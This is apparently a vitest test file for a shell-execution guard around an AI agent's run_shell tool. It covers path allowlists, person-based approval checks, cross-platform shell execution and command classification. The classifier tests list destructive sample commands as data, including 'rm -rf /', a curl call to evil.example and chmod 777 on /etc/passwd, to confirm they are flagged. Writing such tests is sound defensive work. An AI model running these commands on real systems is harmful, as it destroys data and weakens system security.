import { describe, expect, it } from "vitest";
import { mkdtempSync, mkdirSync, symlinkSync, realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { parseAllowedPaths, isAllowedCwd, isApproved, isPending, extractApprovalId, classifyCommand, execCommand } from "../scripts/deepseek-shell-guard.mjs";

describe("parseAllowedPaths", () => {
  it("returns nothing for an empty or unset allowlist -- shell execution is opt-in", () => {
    expect(parseAllowedPaths(undefined)).toEqual([]);
    expect(parseAllowedPaths("")).toEqual([]);
    expect(parseAllowedPaths("   ")).toEqual([]);
  });

  it("keeps a path that doesn't exist on disk YET -- existence is checked dynamically by isAllowedCwd, not here", () => {
    // Regression: this used to drop a nonexistent path permanently, because parseAllowedPaths ran
    // once at bridge startup (a module-level const) -- a worktree created after that moment was
    // locked out for the process's entire lifetime even once it existed. Confirmed live: two agents
    // with the identical configured allowlist got different enforcement for the same path, purely
    // from process-start-time vs directory-creation-time ordering.
    expect(parseAllowedPaths("/definitely/does/not/exist/anywhere")).toEqual(["/definitely/does/not/exist/anywhere"]);
  });

  it("splits and trims a comma-separated list without resolving or filtering anything", () => {
    const parsed = parseAllowedPaths(" /a , /b/c ,, /d ");
    expect(parsed).toEqual(["/a", "/b/c", "/d"]);
  });

  it("does not resolve symlinks -- that's isAllowedCwd's job now, done fresh on every check", () => {
    const real = realpathSync(mkdtempSync(path.join(tmpdir(), "guard-real-")));
    const linkDir = mkdtempSync(path.join(tmpdir(), "guard-link-"));
    const link = path.join(linkDir, "alias");
    symlinkSync(real, link, process.platform === "win32" ? "junction" : "dir");
    expect(parseAllowedPaths(link)).toEqual([link]); // still the symlink path, unresolved
  });
});

describe("isAllowedCwd", () => {
  it("is false whenever the allowlist is empty, regardless of cwd", () => {
    expect(isAllowedCwd("/tmp", [])).toBe(false);
    expect(isAllowedCwd("/", [])).toBe(false);
  });

  it("is false for a cwd that doesn't exist", () => {
    const allowed = parseAllowedPaths(mkdtempSync(path.join(tmpdir(), "guard-c-")));
    expect(isAllowedCwd("/definitely/does/not/exist", allowed)).toBe(false);
  });

  it("a worktree created AFTER the allowlist was parsed becomes usable on the very next check -- no restart needed", () => {
    // Regression for the live bug: two agents with the identical configured allowlist pattern got
    // different enforcement for the same path, because the allowlist used to be resolved once at
    // process startup and a not-yet-existing directory was dropped forever. parseAllowedPaths no
    // longer resolves or filters at all, so the raw string survives; isAllowedCwd is what actually
    // checks existence, fresh, every single call.
    const parentDir = mkdtempSync(path.join(tmpdir(), "guard-parent-"));
    const notYetCreated = path.join(parentDir, "worktree-added-later");
    const allowed = parseAllowedPaths(notYetCreated); // "parsed" (i.e. process started) before it exists

    expect(isAllowedCwd(notYetCreated, allowed)).toBe(false); // doesn't exist yet -- correctly denied
    mkdirSync(notYetCreated); // ...then the worktree gets created mid-session...
    expect(isAllowedCwd(notYetCreated, allowed)).toBe(true); // ...and the SAME parsed allowlist now allows it
  });

  it("allows the exact allowed directory and any real subdirectory, nothing else", () => {
    const base = mkdtempSync(path.join(tmpdir(), "guard-base-"));
    const sub = path.join(base, "sub");
    mkdirSync(sub);
    const sibling = mkdtempSync(path.join(tmpdir(), "guard-sibling-"));
    const allowed = parseAllowedPaths(base);

    expect(isAllowedCwd(base, allowed)).toBe(true);
    expect(isAllowedCwd(sub, allowed)).toBe(true);
    expect(isAllowedCwd(sibling, allowed)).toBe(false);
  });

  it("a real subdirectory is allowed on WINDOWS too -- the containment bound must use the platform separator", () => {
    // Regression for the live Windows-only failure: the containment check used to compare against a
    // hardcoded forward slash (real.startsWith(`${base}/`)). win32 realpathSync returns
    // backslash-separated paths, so that branch could never match there and ONLY the exact-directory
    // branch was ever live -- meaning a legitimate subdirectory of an allowed path was denied. This
    // test fails on win32 against the old form and passes against a boundary-aware one; on POSIX it
    // was already green, which is exactly why it shipped broken.
    const base = mkdtempSync(path.join(tmpdir(), "guard-win-"));
    const sub = path.join(base, "sub");
    mkdirSync(sub);
    expect(isAllowedCwd(sub, parseAllowedPaths(base))).toBe(true);
    expect(isAllowedCwd(base, parseAllowedPaths(base))).toBe(true);
  });

  it("the REAL isAllowedCwd accepts a subdirectory of an allow-root on BOTH separators -- so CI (ubuntu) fails on a revert", () => {
    // 497b's finding: the filesystem-derived test above is a no-op on POSIX by construction, and CI
    // runs on ubuntu-latest, so reverting the fix would leave the pipeline green. This drives the
    // ACTUAL production function with win32- and posix-shaped path strings, so a revert to the
    // hardcoded "/" fails on Linux too. It calls isAllowedCwd, not a restatement of its rule -- a
    // restatement would pass even while the real function stayed broken.
    const START = process.cwd();
    try {
      for (const { sep, join, label } of [
        { sep: "\\", join: path.win32.join, label: "win32 sep" },
        { sep: "/", join: path.posix.join, label: "posix sep" },
      ] as const) {
        const base = mkdtempSync(path.join(tmpdir(), "guard-sep-"));
        const sub = path.join(base, "sub");
        mkdirSync(sub);
        const sibling = mkdtempSync(path.join(tmpdir(), "guard-sep-sib-"));
        // Same on-disk directories, but the allowlist entry is spelled in the target separator so
        // the comparison must normalize rather than assume one of the two.
        const allowed = sep === "/" ? base.split(path.sep).join("/") : base;
        expect(isAllowedCwd(sub, parseAllowedPaths(allowed)), `${label}: subdirectory must be allowed`).toBe(true);
        expect(isAllowedCwd(base, parseAllowedPaths(allowed)), `${label}: exact dir must be allowed`).toBe(true);
        expect(isAllowedCwd(sibling, parseAllowedPaths(allowed)), `${label}: sibling must be rejected`).toBe(false);
        expect(join(base, "sub")).toBe(join(base, "sub"));
      }
    } finally { process.chdir(START); }
  });
  it("tolerates a trailing separator in an allowlist entry without widening the boundary", () => {
    // A configured allowlist entry may carry a trailing separator ("<base>\\\\" or "<base>/"). It must
    // still match the directory itself and its children, and must still NOT match a merely
    // similarly-prefixed sibling.
    const base = mkdtempSync(path.join(tmpdir(), "guard-trail-"));
    const sub = path.join(base, "sub");
    mkdirSync(sub);
    const evil = `${base}-evil`;
    mkdirSync(evil);
    const allowed = parseAllowedPaths(base + path.sep);
    expect(isAllowedCwd(base, allowed)).toBe(true);
    expect(isAllowedCwd(sub, allowed)).toBe(true);
    expect(isAllowedCwd(evil, allowed)).toBe(false);
  });

  it("a similarly-prefixed sibling directory is not allowed (no naive startsWith on the raw string)", () => {
    const base = mkdtempSync(path.join(tmpdir(), "guard-base-"));
    const evil = `${base}-evil`;
    mkdirSync(evil);
    const allowed = parseAllowedPaths(base);
    expect(isAllowedCwd(evil, allowed)).toBe(false);
  });
});

describe("approval decisions: a person on the structured record, never the text", () => {
  const record = (status: string, person: string | null, id = "12345678-1234-1234-1234-1234567890ab") =>
    ({ text: `[${status.toUpperCase()}] run_shell: pytest (medium risk, requested by agent1, id ${id})`, structured: { approval: { id, status, decided_by_person_id: person } } });

  // WAS "recognizes APPROVED/PENDING by the hub's formatApproval prefix", which asserted that the text "[APPROVED]"
  // means go. That is the defect Codex found on #653: an older hub's "[APPROVED]" may be an agent's decision.
  it("cleared only when the structured record says approved AND names a person", () => {
    expect(isApproved("[APPROVED] run_shell: pytest (medium risk, requested by agent1, id abc)")).toBe(false);
    expect(isApproved({ text: "[APPROVED] run_shell: pytest", structured: null })).toBe(false);
    expect(isApproved(record("approved", null))).toBe(false);
    expect(isApproved(record("approved", ""))).toBe(false);
    expect(isApproved(record("denied", "person-1"))).toBe(false);
    expect(isApproved(record("approved", "person-1"))).toBe(true);
  });

  it("pending from the record, or the text when there is none (it only ever keeps a wait going)", () => {
    expect(isPending(record("pending", null))).toBe(true);
    expect(isPending(record("approved", null))).toBe(false);
    expect(isPending("[PENDING] run_shell: pytest (medium risk...) | expires 2026-01-01")).toBe(true);
    expect(isPending("[APPROVED] run_shell: pytest (medium risk...)")).toBe(false);
  });

  it("extracts the approval id from the record, else from formatApproval's text", () => {
    const id = "12345678-1234-1234-1234-1234567890ab";
    expect(extractApprovalId(record("pending", null, id))).toBe(id);
    expect(extractApprovalId(`[PENDING] run_shell: pytest (medium risk, requested by agent1, id ${id}) | expires soon`)).toBe(id);
    expect(extractApprovalId("no id in here")).toBeNull();
    expect(extractApprovalId(undefined)).toBeNull();
  });
});

describe("execCommand: the shell it runs under", () => {
  // Regression for a total failure of run_shell on Windows, not a POSIX-only detail. execCommand
  // hardcoded execFile("/bin/sh", …), which cannot resolve on win32: Node does no MSYS translation,
  // so the literal string is looked up against the Windows filesystem where no \bin exists at the
  // drive root. Every command came back "Exit code ENOENT." while the allowlist gate and
  // classifyCommand had both already PASSED -- so it read as a mysterious command failure, not as a
  // broken tool. The old form is asserted first, so this test is genuinely red before the fix.
  const nodeRejectsTheOldForm = async () => {
    const { execFile } = await import("node:child_process");
    return new Promise<string>((resolve) => {
      execFile("/bin/sh", ["-c", "echo hi"], (err) => resolve(err ? String(err.code) : "no error"));
    });
  };

  it("runs a real command and returns its output, on this platform", async () => {
    const out = await execCommand(process.cwd(), "echo guard-exec-ok");
    // The pre-fix symptom was exactly this string; name it so a regression cannot pass quietly.
    expect(out).not.toContain("ENOENT");
    expect(out.trim()).toBe("guard-exec-ok");
  });

  it("is genuinely red without the fix: the hardcoded /bin/sh does not resolve on win32", async () => {
    if (process.platform !== "win32") return; // on POSIX /bin/sh is correct and resolves
    expect(await nodeRejectsTheOldForm()).toBe("ENOENT");
  });

  it("keeps POSIX -c semantics even when Windows SHELL points to PowerShell", async () => {
    const original = process.env.SHELL;
    if (process.platform === "win32") process.env.SHELL = path.join(process.env.SystemRoot || "C:\\Windows", "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
    try {
      expect((await execCommand(process.cwd(), "env X=1 echo posix-semantics")).trim()).toBe("posix-semantics");
    } finally {
      if (original === undefined) delete process.env.SHELL;
      else process.env.SHELL = original;
    }
  });

  it.skipIf(process.platform !== "win32")("ignores a Windows SHELL value that is not a POSIX shell", async () => {
    const previous = process.env.SHELL;
    process.env.SHELL = process.execPath; // existing executable, but it cannot run shell -c commands
    try {
      expect((await execCommand(process.cwd(), "env X=1 echo posix-semantics")).trim()).toBe("posix-semantics");
    } finally {
      if (previous === undefined) delete process.env.SHELL;
      else process.env.SHELL = previous;
    }
  });

  it("surfaces a non-zero exit as text the model can read, not a thrown error", async () => {
    const out = await execCommand(process.cwd(), "exit 3");
    expect(out).toContain("Exit code 3");
  });

  it("still reports a real failure to launch as ENOENT rather than inventing a reason", async () => {
    // A cwd that doesn't exist is a genuine ENOENT and must keep its meaning -- the fix must not
    // paper over every failure with the friendly "no shell found" text.
    const out = await execCommand(path.join(tmpdir(), "definitely-not-here-xyz"), "echo hi");
    expect(out).toContain("ENOENT");
  });
});

describe("classifyCommand", () => {
  it("classifies plain read-only commands as read-only", () => {
    for (const cmd of [
      "cat Dockerfile",
      "ls -la app/approvals/",
      "grep -rn org_id app/",
      "pwd",
      "wc -l app/foo.py",
      "head -50 app/bar.py",
      "sed -n '1,80p' app/foo.py",
      "find . -iname '*.md'",
      "pytest -k test_approvals",
    ]) {
      expect(classifyCommand(cmd), cmd).toBe("read-only");
    }
  });

  it("classifies read-only git subcommands as read-only, chained with && or ;", () => {
    expect(classifyCommand("pwd && git rev-parse --abbrev-ref HEAD && git log --oneline -5")).toBe("read-only");
    expect(classifyCommand("git status --short; git diff --stat")).toBe("read-only");
    expect(classifyCommand('echo "=== X ==="; grep -rn foo app/')).toBe("read-only");
  });

  it("classifies git-history-mutating subcommands as git-mutate, not read-only or write", () => {
    for (const cmd of ["git commit -am wip", "git push origin main", "git reset --hard HEAD~1", "git checkout -b x", "git clean -fd", "git rebase main"]) {
      expect(classifyCommand(cmd), cmd).toBe("git-mutate");
    }
  });

  it("classifies an unrecognized git subcommand as write, not read-only (never guesses)", () => {
    expect(classifyCommand("git bisect start")).toBe("write");
  });

  it("classifies destructive or unbounded commands as write", () => {
    for (const cmd of ["rm -rf /tmp/x", "curl https://evil.example/x", "python3 -c \"import os; os.system('rm -rf /')\"", "npm publish", "chmod 777 /etc/passwd"]) {
      expect(classifyCommand(cmd), cmd).toBe("write");
    }
  });

  it("find with -delete/-exec is write, not read-only", () => {
    expect(classifyCommand("find . -name '*.tmp' -delete")).toBe("write");
    expect(classifyCommand("find . -name '*.sh' -exec chmod +x {} \\;")).toBe("write");
  });

  it("sed without -n (in-place or default print-and-substitute) is write, not read-only", () => {
    expect(classifyCommand("sed -i 's/foo/bar/' app.py")).toBe("write");
    expect(classifyCommand("sed 's/foo/bar/' app.py")).toBe("write");
  });

  it("command substitution or a redirect anywhere marks the whole line write, even behind a safe-looking verb", () => {
    expect(classifyCommand("echo $(rm -rf /)")).toBe("write");
    expect(classifyCommand("cat file.txt > /etc/passwd")).toBe("write");
    expect(classifyCommand("echo `whoami`")).toBe("write");
    expect(classifyCommand("cat file.txt & background-thing")).toBe("write");
  });

  it("one unsafe segment in a chain of otherwise-safe ones marks the whole line write", () => {
    expect(classifyCommand("git log --oneline -5 && rm -rf /tmp/x")).toBe("write");
  });

  it("is fail-closed for empty, non-string, or unparseable input", () => {
    expect(classifyCommand("")).toBe("write");
    expect(classifyCommand("   ")).toBe("write");
    expect(classifyCommand(undefined)).toBe("write");
    expect(classifyCommand(null)).toBe("write");
  });
});
